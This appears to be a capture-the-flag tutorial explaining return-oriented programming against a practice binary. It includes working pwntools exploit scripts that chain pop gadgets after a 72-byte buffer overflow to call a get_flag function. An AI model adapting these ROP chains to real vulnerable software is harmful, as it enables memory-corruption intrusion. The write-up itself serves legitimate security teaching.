This program is very similiar to the param problem, but without the ability to
set the values of the registers. Our goal is to call `get_flag` with the value
0x1337 in rdi, 0xcafebabe in rsi, and 0xdeadbeef in rdx. To set those registers
we will use a technique called return oriented programming. This is based off
short sequences of code that end with a `ret`, called gadgets. Lets say that we
know that somewhere in the binary exists a section of code that looks like this:

```
    pop rdi
    ret
```

We have full control of the stack from our buffer overflow. That means if we
buffer overflow to jump to this gadget, the next value in our payload will be
placed into rdi. This is because our payload is on the stack. That means the pop
instruction will take the top value off the stack, which we control, and put it
into `rdi`. We can use a tool called ROPgadget to find gadgets. For example, the
problem has the below gadget included. 

`0x00000000004018ca : pop rdi ; ret`

We could buffer overflow to jump to 0x4018ca, and the value we placed in our
payload after the address would be put into rdi. While the problem requires 3
registers to be set, it might be a good idea to do them one at a time and check
that each register is being set properly with a debugger. For example, the
payload 

`payload = b'A'*72 + p64(0x4018ca) + p64(0x1337) + p64(e.sym['get_flag'])`

sets `rdi` to 0x1337. We can then combine multiple gadgets to create a "ROP
chain". This works because each gadget ends with a `ret`, which means we can
just keep returning to a new gadget at the end of each previous gadget. An
example solution for the problem would be the one below

```python
context.binary = 'rop'
p = process('rop')
e = ELF('rop')
#simple solution
#found using ROPGadget --binary rop
#0x00000000004018ca : pop rdi ; ret
#0x000000000040f48e : pop rsi ; ret
#0x00000000004017cf : pop rdx ; ret
chain = flat(0x4018ca,0x1337,0x40f48e,0xcafebabe,0x4017cf,0xdeadbeef,e.sym['get_flag'])
payload = flat({72:chain})
p.sendline(payload)
p.interactive()
```

This solution jumps to 3 gadgets, which each set a register. Then, it jumps to
`get_flag` at the end. This then starts a shell, and we can just print the flag.

pwntools has some advanced tools for ROP chain generation. Here are two
alternative solutions using their tools

```python
#fancy
rop = ROP('rop') # we create a ROP object to start with
rdi = rop.find_gadget(['pop rdi','ret'])[0] # rop.find_gadget searches the binary
# for a gadget, and returns a list of found memory addresses.
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
chain = flat(rdi,0x1337,rsi,0xcafebabe,rdx,0xdeadbeef,e.sym['get_flag'])
payload = flat({72:chain})

#fanciest
rop = ROP('rop')
# The rop object can be used to make entire rop chains for us
# It's smart enough to understand the calling conventions for the current arch
rop.call('get_flag', [0x1337,0xcafebabe, 0xdeadbeef])
# rop.dump prints the rop chain in a human readable way for us to inspect
print(rop.dump())
# rop.chain formats it for being sent to the binary
payload = flat({72: rop.chain()})
```
